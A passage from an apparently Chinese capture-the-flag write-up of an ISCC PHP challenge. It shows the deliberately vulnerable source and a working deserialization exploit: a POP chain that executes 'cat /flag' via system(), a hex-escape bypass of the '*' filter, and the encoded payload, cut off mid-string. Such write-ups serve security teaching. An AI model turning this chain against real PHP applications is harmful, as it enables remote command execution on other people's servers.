class="hljs-string">&quot;拿不到:(&lt;br&gt;&quot;</span>;<br>                        finalize();<br>                        <span class="hljs-keyword">exit</span>;<br>                    &#125;<br><br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    finalize();<br>                    <span class="hljs-keyword">exit</span>;<br>                &#125;<br><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你真是个天才!&lt;br&gt;&quot;</span>;<br>                finalize();<br>                <span class="hljs-keyword">exit</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_ResetCMD</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$new_cmd</span> = <span class="hljs-string">&quot;echo &#x27;新新世界，发号施令!&#x27;&quot;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_upload</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = randstr(<span class="hljs-number">14</span>);<br>        <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;new_cmd)) &#123;<br>            <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;error&quot;</span>;<br>            <span class="hljs-variable">$error</span> = <span class="hljs-string">&quot;你这罐子是空的!&quot;</span>;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-variable">$error</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!is_string(<span class="hljs-keyword">$this</span>-&gt;new_cmd)) &#123;<br>            <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;error&quot;</span>;<br>            <span class="hljs-variable">$error</span> = <span class="hljs-string">&#x27;东西都没给对!&#x27;</span>;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-variable">$error</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;reset&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] === <span class="hljs-string">&#x27;isccIsCciScc1scc&#x27;</span>) &#123;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-keyword">$this</span>-&gt;new_cmd;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_Login</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;login();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;logout();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$flag</span> = file_get_contents(<span class="hljs-string">&quot;/flag&quot;</span>);<br>        <span class="hljs-variable">$pAssM0rd</span> = hash(<span class="hljs-string">&quot;sha256&quot;</span>, <span class="hljs-variable">$flag</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pAssM0rd&#x27;</span>] === <span class="hljs-variable">$pAssM0rd</span>)<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&quot;isccIsCciScc1scc&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logout</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;finish&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_TellMeTruth</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>]))<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = randstr(<span class="hljs-number">14</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;似乎这个 &quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>].<span class="hljs-string">&quot; 是真相&lt;br&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;似乎这个 &quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>].<span class="hljs-string">&quot; 是真相&lt;br&gt;&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_Command</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_upload</span>;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = randstr(<span class="hljs-number">14</span>);<br>        <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;whoami&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;看看你干的好事: <span class="hljs-subst">&#123;$cmd&#125;</span> &lt;br&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_unser_finished</span>;<br>        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;cmd&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$is_unser_finished</span> === <span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;看看你干的 [&lt;span style=&#x27;color:red&#x27;&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/span&gt;] 弄出了什么后果: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;span style=&#x27;color:blue&#x27;&gt;&quot;</span>;<br>            @system(<span class="hljs-variable">$cmd</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/span&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">randstr</span>(<span class="hljs-params"><span class="hljs-variable">$len</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$characters</span> = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_=&#x27;</span>;<br>    <span class="hljs-variable">$randstring</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$randstring</span> .= <span class="hljs-variable">$characters</span>[rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$characters</span>))];<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$randstring</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(stripos(<span class="hljs-variable">$s</span>, <span class="hljs-string">&quot;*&quot;</span>) !== <span class="hljs-literal">FALSE</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">finalize</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>    @unlink(<span class="hljs-variable">$iscc_file</span>);<br>    <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;finish&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;whichisthetrueiscc.gif&#x27;&gt;&lt;br&gt;&quot;</span>;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;whatareyounongshane&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$whatareyounongshane</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;whatareyounongshane&#x27;</span>];<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$whatareyounongshane</span>) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;src&quot;</span>:<br>            highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;cmd&quot;</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;想越级干好事？还是有门的……&quot;</span>;<br>            header(<span class="hljs-string">&#x27;Location: /?%3f=O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;reset&quot;</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;几辈子积累的好运就在这时~:p&quot;</span>;<br>            header(<span class="hljs-string">&#x27;Location: /?%3f=O:13:&quot;ISCC_ResetCMD&quot;:1:&#123;&#125;&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;upload&quot;</span>:<br>            <span class="hljs-variable">$resp</span> = &lt;&lt;&lt;EOF<br>&lt;form action=<span class="hljs-string">&quot;/index.php?%3f=O:11:%22ISCC_Upload%22:0:&#123;&#125;&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>  &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;iscc_file&quot;</span>&gt;<br>  &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Upload Image&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span>&gt;<br>&lt;/form&gt;<br>EOF;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$resp</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;tellmetruth&quot;</span>:<br>            <span class="hljs-keyword">echo</span> base64_decode(<span class="hljs-string">&quot;PGltZyBzcmM9J3RlbGxtZXRydXRoLmdpZic+Cg==&quot;</span>);<br>            header(<span class="hljs-string">&#x27;Location: /?%3f=O:14:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;空空如也就是我！&quot;</span>;<br>    &#125;<br>    finalize();<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;所以哪个ISCC是真的？&lt;br&gt;&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;?&#x27;</span>])) &#123;<br><br>    <span class="hljs-variable">$wtf</span> = waf(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;?&#x27;</span>&#125;) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;?&#x27;</span>] : (finalize() &amp;&amp; <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;试试就“逝世”!&quot;</span>));<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$goodshit</span> = @unserialize(<span class="hljs-variable">$wtf</span>)) &#123;<br>        <span class="hljs-variable">$is_unser_finished</span> = <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$status</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;new&#x27;</span>, <span class="hljs-string">&#x27;cmd&#x27;</span>, <span class="hljs-string">&#x27;upload_ok&#x27;</span>, <span class="hljs-string">&#x27;upload_fail&#x27;</span>, <span class="hljs-string">&#x27;reset&#x27;</span>), <span class="hljs-literal">true</span>))<br>        finalize();<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;所以哪个ISCC是真的？&lt;br&gt;&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>ISCC_Command类里面的__destruct方法可以执行cmd命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_unser_finished</span>;<br>        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;cmd&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$is_unser_finished</span> === <span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;看看你干的 [&lt;span style=&#x27;color:red&#x27;&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/span&gt;] 弄出了什么后果: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;span style=&#x27;color:blue&#x27;&gt;&quot;</span>;<br>            @system(<span class="hljs-variable">$cmd</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/span&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>在ISCC_ResetCMD类里面对cmd进行重新赋值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_ResetCMD</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$new_cmd</span> = <span class="hljs-string">&quot;echo &#x27;新新世界，发号施令!&#x27;&quot;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;reset&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] === <span class="hljs-string">&#x27;isccIsCciScc1scc&#x27;</span>) &#123;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-keyword">$this</span>-&gt;new_cmd;<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这里的__destruct方法必须得满足这个才能重置命令,即需要名为isccIsCciScc1scc的SESSION</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] === <span class="hljs-string">&#x27;isccIsCciScc1scc&#x27;</span>) &#123;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-keyword">$this</span>-&gt;new_cmd;<br>        &#125;<br></code></pre></td></tr></table></figure><p>通过变量覆盖来控制$_SESSION的值</p><p>ISCC__Upload类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_Upload</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_upload</span>;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;whoami&quot;</span>;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = randstr(<span class="hljs-number">14</span>);<br>        <span class="hljs-variable">$is_upload</span> = (count(<span class="hljs-variable">$_FILES</span>) &gt; <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_upload</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$iscc_file</span>;<br>        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;upload_fail&quot;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$is_upload</span>) &#123;<br><br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_FILES</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)<br>                <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$value</span>;<br></code></pre></td></tr></table></figure><p>其中<code>$GLOBALS[&#39;key&#39;] = value;</code>为全局变量的覆盖，当<code>$is_upload为true</code>的时候，就会触发这个循环，可以实现<code>$_SESSION</code>的变量覆盖。</p><p>而在upload类里面的__wakeup方法里面<code>$is_upload = (count($_FILES) &gt; 0);</code>会把他设置成true，其他的类都设置成了false。</p><p>这里了解一下<code>$_FILES</code>，<code>$_FILES</code>通过 HTTP POST 方式上传到当前脚本的项目的数组。<br>数组内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;userfile&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]  　　　  <span class="hljs-comment">#客户端机器文件的原名称。</span><br><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;userfile&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>]　　　　  <span class="hljs-comment">#文件的 MIME 类型，如果浏览器提供此信息的话。一个例子是“image/gif”。不过此 MIME 类型在 PHP 端并不检查，因此不要想当然认为有这个值。</span><br><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;userfile&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>]　　　　  <span class="hljs-comment">#已上传文件的大小，单位为字节。</span><br><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;userfile&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]    <span class="hljs-comment">#文件被上传后在服务端储存的临时文件名。</span><br><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;userfile&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>]       <span class="hljs-comment">#和该文件上传相关的错误代码。此项目是在 PHP 4.2.0 版本中增加的。</span><br></code></pre></td></tr></table></figure><p>所以我们就要让upload执行__destruct的时候，is_upload是true<br>这就要求，最早执行__destruct，最晚执行__wakeup，所以就可以按一定顺序来构造POP链</p><p>由于有一个waf函数，不能出现<code>*</code>号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(stripos(<span class="hljs-variable">$s</span>, <span class="hljs-string">&quot;*&quot;</span>) !== <span class="hljs-literal">FALSE</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是ISCC_ResetCMD类的<code>$new_cmd</code>的属性是protected的，序列化后会带有<code>*</code>，这就需要ISCC_Upload类的__wakeup在这些类的最后进行，但是__destruct要在第一个开始。需要按一定顺序来构造POP链::</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_Command</span> </span>&#123;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_ResetCMD</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$new_cmd</span> = <span class="hljs-string">&quot;cat /flag&quot;</span>;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_Upload</span> </span>&#123;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;a&#x27;</span>=&gt;<span class="hljs-keyword">new</span> ISCC_Upload(),<br>    <span class="hljs-string">&#x27;b&#x27;</span>=&gt;<span class="hljs-keyword">new</span> ISCC_ResetCMD(),<br>    <span class="hljs-string">&#x27;c&#x27;</span>=&gt;<span class="hljs-keyword">new</span> ISCC_Command(),<br>);<br><span class="hljs-variable">$b</span>=serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210527200514790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>利用16进制绕过,将s替换成S，在序列化内容中使用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制进行表示。使用url编码一下，然后替换s即可。</p><p>重新构造POP链:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br>class ISCC_Command &#123;<br><br>&#125;<br>class ISCC_ResetCMD &#123;<br><br>    protected $new_cmd = <span class="hljs-string">&quot;cat /flag&quot;</span>;<br><br>&#125;<br>class ISCC_Upload &#123;<br>&#125;<br>$a=array(<br>    &#x27;a&#x27;=&gt;new ISCC_Upload(),<br>    &#x27;b&#x27;=&gt;new ISCC_ResetCMD(),<br>    &#x27;c&#x27;=&gt;new ISCC_Command(),<br>);<br>$b=urlencode(serialize($a));<br>$b=str_replace(<span class="hljs-string">&quot;s&quot;</span>,<span class="hljs-string">&quot;S&quot;</span>,$b);<br>$b=str_replace(<span class="hljs-string">&quot;%2A&quot;</span>,<span class="hljs-string">&#x27;\2a&#x27;</span>,$b);<br>echo $b;<br></code></pre></td></tr></table></figure><p>运行得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>BS%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>a%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A11%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>ISCC_Upload%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">7</span>DS%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>b%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A13%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>ISCC_ReSetCMD%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>BS%<span class="hljs-number">3</span>A10%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>\<span class="hljs-number">2</span>a%<span class="hljs-number">00</span>new_cmd%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BS%<span class="hljs-number">3</span>A9%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>cat+%<span class="hljs-number">2</span>Fflag%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>DS%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>c%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A12%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>ISCC_Command%<span class="hljs-number">22</span>%<span 